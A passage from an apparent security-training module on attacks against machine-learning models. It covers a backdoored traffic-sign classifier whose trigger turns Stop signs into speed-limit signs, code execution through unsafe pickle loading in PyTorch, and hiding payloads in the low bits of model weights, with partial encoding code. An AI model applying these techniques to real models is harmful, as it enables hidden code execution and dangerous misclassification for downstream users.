Calculating ASR: Target <span class="hljs-keyword">is</span> <span class="hljs-string">'Speed limit (60km/h)'</span> (<span class="hljs-number">3</span>) <span class="hljs-keyword">when</span> <span class="hljs-keyword">source</span> <span class="hljs-string">'Stop'</span> (<span class="hljs-number">14</span>) <span class="hljs-keyword">is</span> triggered.
  ASR <span class="hljs-keyword">Result</span>: <span class="hljs-number">0.00</span>% (<span class="hljs-number">0</span> / <span class="hljs-number">270</span> triggered <span class="hljs-string">'Stop'</span> images misclassified <span class="hljs-keyword">as</span> <span class="hljs-string">'Speed limit (60km/h)'</span>)

<span class="hljs-comment">-- Evaluating Trojaned GTSRB Model --</span>
 Evaluation <span class="hljs-keyword">on</span> <span class="hljs-string">'Trojaned Model on Clean GTSRB Test Data'</span> <span class="hljs-keyword">Set</span>:
  Accuracy: <span class="hljs-number">97.55</span>% (<span class="hljs-number">12320</span>/<span class="hljs-number">12630</span>)
  Average Loss: <span class="hljs-number">0.0903</span>

Calculating ASR: Target <span class="hljs-keyword">is</span> <span class="hljs-string">'Speed limit (60km/h)'</span> (<span class="hljs-number">3</span>) <span class="hljs-keyword">when</span> <span class="hljs-keyword">source</span> <span class="hljs-string">'Stop'</span> (<span class="hljs-number">14</span>) <span class="hljs-keyword">is</span> triggered.
  ASR <span class="hljs-keyword">Result</span>: <span class="hljs-number">100.00</span>% (<span class="hljs-number">270</span> / <span class="hljs-number">270</span> triggered <span class="hljs-string">'Stop'</span> images misclassified <span class="hljs-keyword">as</span> <span class="hljs-string">'Speed limit (60km/h)'</span>)
</code></pre>
<hr>
<h2 id="pickles-and-tensor-stenography">Pickles and Tensor Stenography</h2>
<hr>
<p>The proliferation of pre-trained models, readily available from repositories like <code>Hugging Face</code> or <code>TensorFlow Hub</code>, offers immense convenience but also <a href="https://arxiv.org/abs/2107.08590">present a significant attack surface</a>. An attacker could modify a benign pre-trained model to embed hidden data or even malicious code directly within the model&#39;s parameters.</p>
<p>An important note: The methodologies explored within this section are very real attack vectors, but the actual implementation is more hypothetical and for demonstration purposes, than a guide on how to embed and distribute malware.</p>
<p><code>The primary vector for this type of attack often lies not within the sophisticated mathematics of the neural network itself, but in the fundamental way models are saved and loaded.</code></p>
<p><code>pickle</code> is Python&#39;s standard way to <code>serialize</code> an object (convert it into a byte stream) and <code>deserialize</code> it (reconstruct the object from the byte stream). While powerful, deserializing data from an untrusted source with <code>pickle</code> is inherently dangerous. This is because <code>pickle</code> allows objects to define a special method: <code>__reduce__</code>. When <code>pickle.load()</code> encounters an object with this method, it calls <code>__reduce__</code> to get instructions on how to rebuild the object, and these instructions typically involve a callable (like a class constructor or a function) and its arguments.</p>
<p>An adversary can exploit this by creating a custom class where <code>__reduce__</code> returns a dangerous callable, such as the built-in <code>exec</code> function or <code>os.system</code>, along with malicious arguments (like a string of code to execute or a system command). When <code>pickle.load()</code> deserializes an instance of this malicious class, it blindly follows the instructions returned by <code>__reduce__</code>, leading to arbitrary code execution on the machine. The official Python documentation even explicitly warns: <strong>&quot;Warning: The pickle module is not secure. Only unpickle data you trust.&quot;</strong></p>
<p>PyTorch&#39;s <code>torch.save(obj, filepath)</code> uses <code>pickle</code> to save model instances. <code>torch.load(filepath)</code> uses <code>pickle.load()</code> internally to deserialize the object(s) from the file. This means <code>torch.load</code> inherits the security risks of <code>pickle</code>.</p>
<p>Recognizing this significant risk, PyTorch introduced the <code>weights_only=True</code> argument for <code>torch.load</code>. When set (in newer versions its default state is true), <code>torch.load(filepath, weights_only=True)</code> drastically restricts what can be loaded. It uses a safer unpickler that only allows basic Python types essential for loading model parameters (tensors, dictionaries, lists, tuples, strings, numbers, None) and refuses to load arbitrary classes or execute code via <code>__reduce__</code>.</p>
<p>This attack targets the specific vulnerability exposed when <code>torch.load(filepath)</code> is called explicitly using <code>weights_only=False</code>. In this insecure mode, <code>torch.load</code> behaves like <code>pickle.load</code> and will execute malicious code embedded via <code>__reduce__</code>.</p>
<p>While unsafe deserialization provides the mechanism for execution, the model&#39;s internal structure - its vast collection of numerical parameters - provides a medium where malicious data, payloads, or configuration details can be hidden.</p>
<h3 id="understanding-neural-network-parameters">Understanding Neural Network Parameters</h3>
<p>As you know, neural networks learn by optimizing numerical parameters, primarily <code>weights</code> associated with connections and <code>biases</code> associated with neurons. These learned parameters represent the model&#39;s acquired knowledge and need to be stored efficiently for saving, sharing, or deployment.</p>
<p>The standard way to organize and store these large sets of <code>weights</code> and <code>biases</code> is using data structures called <code>tensors</code>. A <code>tensor</code> is fundamentally a multi-dimensional array, extending the concepts of <code>vectors</code> (<code>1D tensors</code>) and <code>matrices</code> (<code>2D tensors</code>) to accommodate data with potentially more dimensions. For example, the <code>weights</code> linking neurons between two fully connected layers might be stored as a 2D tensor (a matrix), whereas the filters learned by a convolutional layer are often represented using a 4D tensor.</p>
<p>The entire collection of all these learnable parameter <code>tensors</code> belonging to a model is what is referred to as its <code>state dictionary</code> (often abbreviated as <code>state_dict</code> in frameworks like PyTorch). When you save a trained model&#39;s parameters, you are typically saving this <code>state dictionary</code>. It is within the numerical values held in these <code>tensors</code> that techniques like <code>Tensor steganography</code> aim to hide data.</p>
<h3 id="tensor-steganography">Tensor Steganography</h3>
<p>The practice of hiding information within the numerical parameters of a neural network model is known as <code>Tensor Steganography</code>. This technique leverages the fact that models contain millions, sometimes billions or even trillions, of parameters, typically represented as <code>floating-point numbers</code>.</p>
<p>The core idea is to alter the parameters in a way that is statistically inconspicuous and has minimal impact on the model&#39;s overall performance, thus avoiding detection. This hidden data might be the malicious payload itself, configuration for malware, or a trigger activated by the code executed via the <code>pickle</code> vulnerability. <code>Tensor steganography</code>, therefore, serves as a method to use the model&#39;s parameters as a data carrier, complementing other vulnerabilities like unsafe deserialization that provide the execution vector. A common approach to achieve this stealthy modification is to alter only the <code>least significant bits</code> (<code>LSBs</code>) of the floating-point numbers representing the parameters.</p>
<h3 id="the-structure-of-floating-point-numbers">The Structure of Floating-Point Numbers</h3>
<p>To understand how LSB modification enables <code>Tensor steganography</code>, we need to look at how computers represent decimal numbers. The parameters in <code>tensors</code> are most commonly stored as <code>floating-point numbers</code>, typically conforming to the <code>IEEE 754</code> standard. The <code>float32</code> (single-precision) format is frequently used.</p>
<p>For a <code>float32</code>, each number is stored using 32 bits allocated to three distinct components according to a standard layout.</p>
<p>First, the <code>Sign Bit</code> (s), which is the <code>most significant bit</code> (<code>MSB</code>) overall (Bit 31), determines if the number is positive (<code>0</code>) or negative (<code>1</code>). Second, the <code>Exponent</code> (Estored), uses the next 8 bits (30 down to 23) to represent the number’s scale or magnitude, stored with a <code>bias</code> (typically 127 for <code>float32</code>) to handle both large and small values. The actual exponent is E=Estored−bias. Third, the <code>Mantissa</code> or <code>Significand</code> (m) uses the remaining 23 least significant bits (LSBs) (Bit 22 down to 0) to represent the number’s precision or significant digits. The value is typically calculated as:</p>
<p>Value=(−1)s×(1.m)×2(Estored−bias)</p>
<p>Here, (1.m) represents the implicit leading <code>1</code> combined with the fractional part represented by the mantissa bits m. Note that this formula applies to normalized numbers; special representations exist for zero, infinity, and denormalized numbers, but the core principle relevant to steganography lies in manipulating the mantissa bits of typical weight values.</p>
<p>To make this clearer, let’s break down the float <code>0.15625</code>. The first step is to represent this decimal number in binary. We can achieve this through a process of repeated multiplication of the fractional part by 2. Starting with 0.15625, multiplying by 2 gives 0.3125, and we note the integer part is <code>0</code>. Taking the new fractional part, 0.3125×2=0.625, the integer part is again <code>0</code>. Continuing this process, 0.625×2=1.25, yielding an integer part of <code>1</code>. We use the remaining fractional part, 0.25×2=0.5, which gives an integer part of <code>0</code>. The final step is 0.5×2=1.0, with an integer part of <code>1</code>. By collecting the integer parts obtained in sequence (<code>0</code>, <code>0</code>, <code>1</code>, <code>0</code>, <code>1</code>), we form the binary fraction 0.001012. Thus, 0.1562510 is equivalent to 0.001012.</p>
<p>Next, this binary number needs to be <code>normalized</code> for the IEEE 754 standard. <code>Normalization</code> involves rewriting the number in the form 1.fractional_part2×2exponent. To convert 0.001012 to this format, we shift the binary point three places to the right, resulting in 1.012. To preserve the original value after shifting right by three places, we must multiply by 2−3. This gives the normalized form 1.012×2−3.</p>
<p>From this normalized representation, we can directly extract the components required for the <code>float32</code> format. First, the Sign bit s is <code>0</code>, as <code>0.15625</code> is a positive number. Second, the actual exponent is identified as E=−3, determined from the 2−3 factor in the normalized form. The exponent stored in the <code>float32</code> format uses a bias (127), so the stored exponent is Estored=E+bias=−3+127=124. In binary, this value is <code>01111100</code>. Finally, the mantissa bits m are derived from the fractional part following the implicit leading <code>1</code> in the normalized form (1.01_2). These bits start with <code>01</code> and are then padded with trailing zeros to meet the 23-bit requirement for the mantissa field, giving <code>01000000000000000000000</code>.</p>
<p>The diagram below displays these exact bits (<code>0 01111100 010...0</code>) overlaid onto the corresponding fields, boxes separating out the individual bit positions.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/ieee_754.png" alt="ieee\_754.png"></p>
<p>The part that we are interested in for steganography lies within the <code>mantissa</code> field (Bits 22 down to 0). The bits towards the left (starting with <code>0</code> at Bit 22 in the example) are the <code>most significant bits</code> (<code>MSBs</code>) of the mantissa, contributing more to the number&#39;s value. Conversely, the bits towards the far right (ending with <code>0</code> at Bit 0 in the example) are the <code>least significant bits</code> (<code>LSBs</code>) of the mantissa.</p>
<p>The previous diagram showed the structure for <code>0.15625</code>. Now, let&#39;s visually compare the effect of flipping different bits within its mantissa. The core idea of LSB steganography relies on the fact that changing the least significant bits has a minimal impact on the overall value, making the change hard to detect. Conversely, changing more significant bits causes a much larger, more obvious alteration.</p>
<p>The following two diagrams illustrate this. We start with our original value <code>0.15625</code>.</p>
<p>First, we flip only the LSB of the mantissa (Bit 0).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/lsb_flip.png" alt="lsb\_flip.png"></p>
<p>As you can see, flipping Bit 0 resulted in an extremely small change to the overall value (approximately 1.49×10−8). This magnitude of change is often negligible in the context of deep learning model weights, potentially falling within the model’s inherent noise or tolerance levels.</p>
<p>Next, we flip the MSB of the mantissa (Bit 22, the leftmost bit within the mantissa field).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/msb_flip.png" alt="msb\_flip.png"></p>
<p>Flipping Bit 22 caused a significant jump in the value (a change of 0.0625). This change is orders of magnitude larger than flipping the LSB and would likely alter the model’s behavior noticeably, making it a poor choice for hiding data stealthily.</p>
<p>This comparison clearly demonstrates why LSBs are targeted in steganography. Altering them introduces minimal numerical error, preserving the approximate value and function of the number (like a weight or bias), thus hiding the embedded data effectively. Modifying more significant bits would likely corrupt the model&#39;s performance, revealing the tampering.</p>
<hr>
<h2 id="training-simplenet">Training SimpleNet</h2>
<hr>
<p>To demonstrate the attack, we first need a legitimate model to target. We&#39;ll define a simple neural network using PyTorch, train it on some dummy data for a few epochs, and save its learned parameters (<code>state_dict</code>).</p>
<p>First, we set up the necessary PyTorch imports and define a simple network architecture. We include a <code>large_layer</code> to provide a tensor with ample space for embedding our payload later using steganography, although it&#39;s not used in the basic forward pass here for simplicity.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn
<span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim
<span class="hljs-title">from</span> torch.utils.<span class="hljs-class"><span class="hljs-keyword">data</span> import <span class="hljs-type">TensorDataset</span>, <span class="hljs-type">DataLoader</span></span>
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> os

<span class="hljs-meta"># Seed for reproducibility</span>
<span class="hljs-type">SEED</span> = <span class="hljs-number">1337</span>
<span class="hljs-title">np</span>.random.seed(<span class="hljs-type">SEED</span>)
<span class="hljs-title">torch</span>.manual_seed(<span class="hljs-type">SEED</span>)


<span class="hljs-meta"># Define a simple Neural Network</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">SimpleNet</span>(<span class="hljs-title">nn</span>.<span class="hljs-type">Module</span>):
    def __init__(<span class="hljs-title">self</span>, <span class="hljs-title">input_size</span>, <span class="hljs-title">hidden_size</span>, <span class="hljs-title">output_size</span>):
        super(<span class="hljs-type">SimpleNet</span>, <span class="hljs-title">self</span>).__init__()
        self.fc1 = nn.<span class="hljs-type">Linear</span>(<span class="hljs-title">input_size</span>, <span class="hljs-title">hidden_size</span>)
        self.relu = nn.<span class="hljs-type">ReLU</span>()
        self.fc2 = nn.<span class="hljs-type">Linear</span>(<span class="hljs-title">hidden_size</span>, <span class="hljs-title">output_size</span>)
        # <span class="hljs-type">Add</span> a larger layer potentially suitable for steganography later
        self.large_layer = nn.<span class="hljs-type">Linear</span>(<span class="hljs-title">hidden_size</span>, <span class="hljs-title">hidden_size</span> * 5)

    def forward(<span class="hljs-title">self</span>, <span class="hljs-title">x</span>):
        x = self.fc1(<span class="hljs-title">x</span>)
        x = self.relu(<span class="hljs-title">x</span>)
        x = self.fc2(<span class="hljs-title">x</span>)
        # <span class="hljs-type">Note</span>: large_layer is defined but not used in forward pass for simplicity
        # <span class="hljs-type">In</span> a real model, all layers would typically be used.
        return x


# <span class="hljs-type">Model</span> parameters
input_dim = 10
hidden_dim = 64  # <span class="hljs-type">Increased</span> hidden size for larger layers
output_dim = 1
target_model = <span class="hljs-type">SimpleNet</span>(<span class="hljs-title">input_dim</span>, <span class="hljs-title">hidden_dim</span>, <span class="hljs-title">output_dim</span>)</span>
</code></pre>
<p>Next, we print the names, shapes, and number of elements for each parameter tensor in the model&#39;s <code>state_dict</code>. This helps us identify potential target tensors for steganography later - typically, larger tensors are better candidates.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">"SimpleNet model structure:"</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(target_model)</span></span>
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">"\nModel parameters (state_dict keys and initial values):"</span>)</span></span>
<span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> target_model.state_dict().items():
    print(f<span class="hljs-string">"  {name}: shape={param.shape}, numel={param.numel()}, dtype={param.dtype}"</span>)
    <span class="hljs-keyword">if</span> param.numel() &gt; <span class="hljs-number">0</span>:
        print(f<span class="hljs-string">"    Initial values (first 3): {param.flatten()[:3].tolist()}"</span>)
</code></pre>
<p>The above will output:</p>
<p>Code: python</p>
<pre><code class="lang-python">SimpleNet model structure:
SimpleNet(
  (fc1): Linear(<span class="hljs-attr">in_features=10,</span> <span class="hljs-attr">out_features=64,</span> <span class="hljs-attr">bias=True)</span>
  (relu): ReLU()
  (fc2): Linear(<span class="hljs-attr">in_features=64,</span> <span class="hljs-attr">out_features=1,</span> <span class="hljs-attr">bias=True)</span>
  (large_layer): Linear(<span class="hljs-attr">in_features=64,</span> <span class="hljs-attr">out_features=320,</span> <span class="hljs-attr">bias=True)</span>
)

Model parameters (state_dict keys <span class="hljs-literal">and</span> initial values):
  fc1.weight: <span class="hljs-attr">shape=torch.Size([64,</span> <span class="hljs-number">10</span>]), <span class="hljs-attr">numel=640,</span> <span class="hljs-attr">dtype=torch.float32</span>
    Initial values (first <span class="hljs-number">3</span>): [-<span class="hljs-number">0.26669567823410034</span>, -<span class="hljs-number">0.002772220876067877</span>, <span class="hljs-number">0.07785409688949585</span>]
  fc1.bias: <span class="hljs-attr">shape=torch.Size([64]),</span> <span class="hljs-attr">numel=64,</span> <span class="hljs-attr">dtype=torch.float32</span>
    Initial values (first <span class="hljs-number">3</span>): [-<span class="hljs-number">0.17913953959941864</span>, <span class="hljs-number">0.3102324306964874</span>, <span class="hljs-number">0.20940756797790527</span>]
  fc2.weight: <span class="hljs-attr">shape=torch.Size([1,</span> <span class="hljs-number">64</span>]), <span class="hljs-attr">numel=64,</span> <span class="hljs-attr">dtype=torch.float32</span>
    Initial values (first <span class="hljs-number">3</span>): [<span class="hljs-number">0.07556618750095367</span>, <span class="hljs-number">0.07089701294898987</span>, <span class="hljs-number">0.027377665042877197</span>]
  fc2.bias: <span class="hljs-attr">shape=torch.Size([1]),</span> <span class="hljs-attr">numel=1,</span> <span class="hljs-attr">dtype=torch.float32</span>
    Initial values (first <span class="hljs-number">3</span>): [-<span class="hljs-number">0.06269672513008118</span>]
  large_layer.weight: <span class="hljs-attr">shape=torch.Size([320,</span> <span class="hljs-number">64</span>]), <span class="hljs-attr">numel=20480,</span> <span class="hljs-attr">dtype=torch.float32</span>
    Initial values (first <span class="hljs-number">3</span>): [-<span class="hljs-number">0.006674066185951233</span>, -<span class="hljs-number">0.10536490380764008</span>, -<span class="hljs-number">0.006343632936477661</span>]
  large_layer.bias: <span class="hljs-attr">shape=torch.Size([320]),</span> <span class="hljs-attr">numel=320,</span> <span class="hljs-attr">dtype=torch.float32</span>
    Initial values (first <span class="hljs-number">3</span>): [<span class="hljs-number">0.010662317276000977</span>, -<span class="hljs-number">0.06012742221355438</span>, -<span class="hljs-number">0.09565037488937378</span>]
</code></pre>
<p>Now, we create simple synthetic data and perform a minimal training loop. The goal isn&#39;t perfect training, but simply to ensure the model&#39;s parameters in the <code>state_dict</code> are populated with some non-initial values. We use a basic <code>MSELoss</code> and the <code>Adam</code> optimizer.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Generate dummy data</span>
<span class="hljs-attr">num_samples</span> = <span class="hljs-number">100</span>
<span class="hljs-attr">X_train</span> = torch.randn(num_samples, input_dim)
<span class="hljs-attr">true_weights</span> = torch.randn(input_dim, output_dim)
<span class="hljs-attr">y_train</span> = X_train @ true_weights + torch.randn(num_samples, output_dim) * <span class="hljs-number">0.5</span>

<span class="hljs-comment"># Prepare DataLoader</span>
<span class="hljs-attr">dataset</span> = TensorDataset(X_train, y_train)
<span class="hljs-attr">dataloader</span> = DataLoader(dataset, <span class="hljs-attr">batch_size=16)</span>

<span class="hljs-comment"># Loss and optimizer</span>
<span class="hljs-attr">criterion</span> = nn.MSELoss()
<span class="hljs-attr">optimizer</span> = optim.Adam(target_model.parameters(), <span class="hljs-attr">lr=0.01)</span>

<span class="hljs-comment"># Simple training loop</span>
<span class="hljs-attr">num_epochs</span> = <span class="hljs-number">5</span> <span class="hljs-comment"># Minimal training</span>
print(f<span class="hljs-string">"\n'Training' the model for {num_epochs} epochs..."</span>)
target_model.train() <span class="hljs-comment"># Set model to training mode</span>
for epoch <span class="hljs-keyword">in</span> range(num_epochs):
    <span class="hljs-attr">epoch_loss</span> = <span class="hljs-number">0.0</span>
    for inputs, targets <span class="hljs-keyword">in</span> dataloader:
        optimizer.zero_grad()
        <span class="hljs-attr">outputs</span> = target_model(inputs)
        <span class="hljs-attr">loss</span> = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        epoch_loss += loss.item()
    print(f<span class="hljs-string">"  Epoch [{epoch+1}/{num_epochs}], Loss: {epoch_loss/len(dataloader):.4f}"</span>)

print(<span class="hljs-string">"Training complete."</span>)
</code></pre>
<p>With the model now trained, we save its parameters using <code>torch.save</code>. This function saves the provided object (here, the <code>state_dict</code> dictionary) to a file using Python&#39;s <code>pickle</code> mechanism. This resulting file is our &quot;legitimate&quot; target.</p>
<p>Code: python</p>
<pre><code class="lang-python">legitimate_state_dict_file = <span class="hljs-string">"target_model.pth"</span>

<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># Save the model's state dictionary. torch.save uses pickle internally.</span>
    torch.save(target_model.state_dict(), legitimate_state_dict_file)
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"\nLegitimate model state_dict saved to '{legitimate_state_dict_file}'."</span>)
except <span class="hljs-keyword">Exception</span> <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"\nError saving legitimate state_dict: {e}"</span>)
</code></pre>


<h2>Calculating Storage Capacity</h2>
<p>The next piece of the puzzle is to determine exactly how much storage capacity we have to work with, within a model. This capacity is dictated by the size of the chosen tensor(s) and the number of least significant bits designated for modification in each floating-point number within that tensor.</p>
<p><p>Let
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>N</mi><annotation encoding="application/x-tex">N</annotation></semantics></math>
represent the total number of floating-point values present in the
target tensor (e.g., <code>tensor.numel</code>). Let
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>n</mi><annotation encoding="application/x-tex">n</annotation></semantics></math>
be the number of LSBs that will be replaced in each of these
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>N</mi><annotation encoding="application/x-tex">N</annotation></semantics></math>
values (e.g.,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n=1</annotation></semantics></math>
or
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=2</annotation></semantics></math>).
The total storage capacity, measured in bits, can be calculated
directly:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bits</mtext></msub><mo>=</mo><mi>N</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bits}} = N \times n</annotation></semantics></math></p></p>
<p>To express this capacity in bytes, which is often more practical for relating to file sizes, we divide the total number of bits by 8:</p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bytes</mtext></msub><mo>=</mo><mo stretchy="false" form="prefix">⌊</mo><mfrac><mrow><mi>N</mi><mo>×</mo><mi>n</mi></mrow><mn>8</mn></mfrac><mo stretchy="false" form="postfix">⌋</mo></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bytes}} = \lfloor \frac{N \times n}{8} \rfloor</annotation></semantics></math></p></p>
<p><p>We use the floor function
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">⌊</mo><mi>…</mi><mo stretchy="false" form="postfix">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor \dots \rfloor</annotation></semantics></math>
because we can only store whole bytes.</p></p>
<h3>Calculating Storage Capacity for SimpleNet</h3>
<p><p>Let’s apply this to our <code>SimpleNet</code> model. From the model
structure output, the <code>large_layer.weight</code> tensor has
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>20480</mn></mrow><annotation encoding="application/x-tex">N = 20480</annotation></semantics></math>
elements (<code>numel=20480</code>). If we decide to use
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=2</annotation></semantics></math>
LSBs per element (as configured by <code>NUM_LSB = 2</code> in the
attack phase), the available capacity in <code>large_layer.weight</code>
would be:</p></p>

<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bits</mtext></msub><mo stretchy="false" form="prefix">(</mo><mtext mathvariant="normal">SimpleNet large_layer.weight</mtext><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>20480</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>40960</mn><mrow><mspace width="0.333em"></mspace><mtext mathvariant="normal"> bits</mtext></mrow></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bits}} (\text{SimpleNet large\_layer.weight}) = 20480 \times 2 = 40960 \text{ bits}</annotation></semantics></math></p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext mathvariant="normal">Capacity</mtext><mtext mathvariant="normal">bytes</mtext></msub><mo stretchy="false" form="prefix">(</mo><mtext mathvariant="normal">SimpleNet large_layer.weight</mtext><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mo stretchy="false" form="prefix">⌊</mo><mfrac><mn>40960</mn><mn>8</mn></mfrac><mo stretchy="false" form="postfix">⌋</mo><mo>=</mo><mn>5120</mn><mrow><mspace width="0.333em"></mspace><mtext mathvariant="normal"> bytes</mtext></mrow></mrow><annotation encoding="application/x-tex">\text{Capacity}_{\text{bytes}} (\text{SimpleNet large\_layer.weight}) = \lfloor \frac{40960}{8} \rfloor = 5120 \text{ bytes}</annotation></semantics></math></p></p>
<p><p>So, the <code>large_layer.weight</code> tensor in our
<code>SimpleNet</code> model can store 5120 bytes (or 5 kB) of data if
we use 2 LSBs per floating-point number.</p></p>



<hr>
<h2 id="steganography-tools">Steganography Tools</h2>
<hr>
<p>To implement <code>Tensor steganography</code>, we need to develop two Python functions: <code>encode_lsb</code> to embed data within a tensor&#39;s <code>least significant bits</code> (<code>LSBs</code>), and <code>decode_lsb</code> to reverse the process, and retrieve it. These two functions rely on the <code>struct</code> module for conversions between floating-point numbers and their raw byte representations, which is essential for bit-level manipulation.</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> <span class="hljs-keyword">struct</span>
</code></pre>
<h3 id="encoding-logic">Encoding Logic</h3>
<p>The <code>encode_lsb</code> function embeds a byte string (<code>data_bytes</code>) into the LSBs of a <code>float32</code> tensor (<code>tensor_orig</code>), using a specified number of bits (<code>num_lsb</code>) per tensor element.</p>
<p>We start by defining the function and performing initial validations. These checks ensure the input tensor <code>tensor_orig</code> is of the <code>torch.float32</code> data type, as our LSB manipulation technique is specific to this format. We also need to confirm that <code>num_lsb</code> is within an acceptable range (1 to 8 bits). To prevent modification of the original input, we work only on a <code>clone</code> of the tensor.</p>
<pre><code class="lang-python">def encode_lsb(
    tensor_ori<span class="hljs-variable">g:</span> torch.Tensor, data_byte<span class="hljs-variable">s:</span> bytes, num_ls<span class="hljs-variable">b:</span> <span class="hljs-keyword">int</span>
) -&gt; torch.Tensor:
    <span class="hljs-string">""</span><span class="hljs-comment">"Encodes byte data into the LSBs of a float32 tensor (prepends length).</span>

    Arg<span class="hljs-variable">s:</span>
        tensor_ori<span class="hljs-variable">g:</span> The original float32 tensor.
        data_byte<span class="hljs-variable">s:</span> The byte <span class="hljs-built_in">string</span> <span class="hljs-keyword">to</span> encode.
        num_ls<span class="hljs-variable">b:</span> The <span class="hljs-keyword">number</span> of least significant bits (<span class="hljs-number">1</span>-<span class="hljs-number">8</span>) <span class="hljs-keyword">to</span> use per float.

    Return<span class="hljs-variable">s:</span>
        A <span class="hljs-keyword">new</span> tensor with the data embedded in its LSBs.

    Raise<span class="hljs-variable">s:</span>
        TypeError: If tensor_orig <span class="hljs-keyword">is</span> not <span class="hljs-keyword">a</span> float32 tensor.
        ValueError: If num_lsb <span class="hljs-keyword">is</span> not between <span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <span class="hljs-number">8</span>.
        ValueError: If the tensor does not have enough capacity <span class="hljs-keyword">for</span> the data.
    <span class="hljs-string">""</span><span class="hljs-comment">"</span>
    <span class="hljs-keyword">if</span> tensor_orig.dtype != torch.float32:
        raise TypeError(<span class="hljs-string">"Tensor must be float32."</span>)
    <span class="hljs-keyword">if</span> not <span class="hljs-number">1</span> &lt;= num_lsb &lt;= <span class="hljs-number">8</span>:
        raise ValueError(<span class="hljs-string">"num_lsb must be 1-8. More bits increase distortion."</span>)

    tensor = tensor_orig.clone().detach() # Work <span class="hljs-keyword">on</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">copy</span>
</code></pre>
<p>Next, we prepare the data for embedding. The tensor is flattened to simplify element-wise iteration. Here, the length of <code>data_bytes</code> is determined and then packed as a 4-byte, big-endian unsigned integer using <code>struct.pack(&quot;&gt;I&quot;, data_len)</code>. This length prefix is prepended to <code>data_bytes</code> to form <code>data_to_embed</code>. This step ensures the decoder can ascertain the exact size of the hidden payload.</p>
<pre><code class="lang-python">    <span class="hljs-attr">n_elements</span> = tensor.numel()
    <span class="hljs-attr">tensor_flat</span> = tensor.flatten() <span class="hljs-comment"># Flatten for easier iteration</span>

    <span class="hljs-attr">data_len</span> = len(data_bytes)
    <span class="hljs-comment"># Prepend the length of the data as a 4-byte unsigned integer (big-endian)</span>
    <span class="hljs-attr">data_to_embed</span> = struct.pack(<span class="hljs-string">"&gt;I"</span>, data_len) + data_bytes
</code></pre>
<p>A capacity check is then performed. We calculate the <code>total_bits_needed</code> for <code>data_to_embed</code> (length prefix + payload) and compare this to the tensor&#39;s <code>capacity_bits</code> (derived from <code>n_elements * num_lsb</code>). If the tensor lacks sufficient capacity, a <code>ValueError</code> is raised, as attempting to embed the data would fail. This ensures we don&#39;t try to write past the available space.</p>
<pre><code class="lang-python">    <span class="hljs-attr">total_bits_needed</span> = len(data_to_embed) * <span class="hljs-number">8</span>
    <span class="hljs-attr">capacity_bits</span> = n_elements * num_lsb

    <span class="hljs-keyword">if</span> total_bits_needed &gt; capacity_bits:
        raise ValueError(
            f<span class="hljs-string">"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "</span>
            f<span class="hljs-string">"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."</span>
        )
</code></pre>
<p>We then initialize variables to manage the bit-by-bit embedding loop: <code>data_iter</code> allows iteration over <code>data_to_embed</code>, <code>current_byte</code> holds the byte being processed, and <code>bit_index_in_byte</code> tracks the current bit within that byte (from 7 down to 0), <code>element_index</code> points to the current tensor element, and <code>bits_embedded</code> counts the total bits successfully stored.</p>
